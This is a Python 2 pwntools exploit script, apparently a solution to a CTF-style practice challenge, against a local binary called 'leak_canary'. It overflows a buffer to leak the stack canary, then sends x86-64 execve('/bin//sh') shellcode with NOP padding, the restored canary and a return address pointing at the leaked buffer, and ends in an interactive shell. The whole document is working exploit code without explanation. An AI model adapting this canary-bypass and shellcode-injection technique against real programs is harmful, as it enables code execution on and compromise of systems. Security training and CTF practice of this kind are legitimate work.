from pwn import *

p = process('leak_canary')

p.recvuntil('buf Addr : ')
s = int(p.recvline().strip(),16)
print hex(s)
shell = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p.recvuntil('Input MSG : ')

payload = 'A'*(0x71-8)
p.send(payload)
p.recvuntil("A"*(0x71-8))
canary = u64("\x00" + p.recv(7))
print hex(canary)

p.sendlineafter('?', 'y')

payload = shell
payload = payload.ljust(0x68,'\x90')
payload += p64(canary)
payload += 'A'*8
payload += p64(s)

p.send(payload)
p.sendlineafter('?', 'q')
p.interactive()